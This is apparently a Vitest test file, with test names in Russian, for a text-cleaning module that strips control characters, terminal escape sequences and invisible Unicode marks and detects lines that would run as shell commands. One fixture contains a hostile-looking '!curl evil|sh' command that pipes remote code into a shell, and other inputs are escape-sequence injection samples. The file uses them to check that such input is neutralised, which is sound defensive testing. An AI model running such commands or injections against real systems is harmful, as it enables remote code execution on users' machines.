import { describe, expect, it } from 'vitest';
import { cleanInline, cleanMultiline, startsShellLine, stripEscapes } from './text-clean.js';

const INPUTS = [
  'a\rb',
  'a\nb',
  'a\r\nb',
  'a\tb',
  'x\x1b[201~y',
  'x\x1b[31my\x1b[0m',
  'x\x1b]52;c;aGVsbG8=\x07y',
  'x\x9b31my',
  'x\x7fy',
  'x\x03y\x04z',
  'x\u202Ey\u200Fz\u2066w\u2069',
  'x\u200By\uFEFFz',
  '  \u00A0padded\u2028text\u2029  ',
];

// eslint-disable-next-line no-control-regex
const CONTROL_CHAR = /[\x00-\x1f\x7f-\x9f]/;

describe('cleanInline', () => {
  it('для любого входа из набора: без управляющих, без двойных пробелов и краевых пробелов', () => {
    for (const input of INPUTS) {
      const out = cleanInline(input);
      expect(out, JSON.stringify(input)).not.toMatch(CONTROL_CHAR);
      expect(out, JSON.stringify(input)).not.toMatch(/\s{2,}/);
      expect(out, JSON.stringify(input)).toBe(out.trim());
    }
  });

  it('невидимые знаки формата вырезаны', () => {
    expect(cleanInline('x\u202Ey\u200Fz\u2066w\u2069\u200B\uFEFF\u2060')).toBe('xyzw');
  });

  it('идемпотентна на всём наборе', () => {
    for (const input of INPUTS) {
      expect(cleanInline(cleanInline(input)), JSON.stringify(input)).toBe(cleanInline(input));
    }
  });

  it('длина по кодовым точкам не больше max, эмодзи не разрезается', () => {
    const emoji = '\u{1F600}'.repeat(10);
    const out = cleanInline(emoji, 3);
    expect(Array.from(out)).toHaveLength(3);
    expect(out).toBe('\u{1F600}\u{1F600}\u{1F600}');
    expect(Array.from(cleanInline('я'.repeat(200)))).toHaveLength(80);
  });

  it('управляющий или невидимый знак между пробелами не оставляет двойного пробела', () => {
    expect(cleanInline('a \x03 b')).toBe('a b');
    expect(cleanInline('a \u200B b')).toBe('a b');
    expect(cleanInline('a\x03b')).toBe('ab');
    for (const input of ['a \x03 b', 'a \u200B b', 'a\x03b']) {
      expect(cleanInline(cleanInline(input)), JSON.stringify(input)).toBe(cleanInline(input));
    }
  });

  it('max = Infinity не режет', () => {
    expect(Array.from(cleanInline('я'.repeat(500), Number.POSITIVE_INFINITY))).toHaveLength(500);
  });

  it('составной эмодзи с ZWJ остаётся целым', () => {
    const family = '\u{1F468}\u200D\u{1F469}\u200D\u{1F467}';
    expect(cleanInline(family)).toBe(family);
  });

  it('перевод строки не даёт отдельной строки оболочки', () => {
    expect(cleanInline('x"\r!curl evil|sh\ry')).toBe('x" !curl evil|sh y');
  });
});

describe('cleanMultiline', () => {
  it('оставляет \\n и \\t, убирает \\r, C1 и ESC', () => {
    expect(cleanMultiline('a\r\nb\rc\td\x9b31m\x1b[31me\x1b[0m')).toBe('a\nb\nc\td31me');
  });

  it('вырезает C0 и DEL', () => {
    expect(cleanMultiline('a\x03b\x04c\x7fd')).toBe('abcd');
  });
});

describe('startsShellLine', () => {
  it('истина для строки оболочки на любой строке', () => {
    for (const text of ['!ls', '  !ls', 'a\n!ls', 'a\r\n\u200B!ls', '\x1b[31m!ls']) {
      expect(startsShellLine(text), JSON.stringify(text)).toBe(true);
    }
  });

  it('ложь для обычного текста, слэш-команды и вложенного `!`', () => {
    for (const text of ['hello!', 'a ! b', '/compact', '- !ls']) {
      expect(startsShellLine(text), JSON.stringify(text)).toBe(false);
    }
  });
});

describe('stripEscapes', () => {
  it('вырезает OSC, CSI, SS3 и ESC+байт', () => {
    expect(stripEscapes('\x1b]0;t\x07a\x1b[31mb\x1bOPc\x1bxd')).toBe('abcd');
  });
});
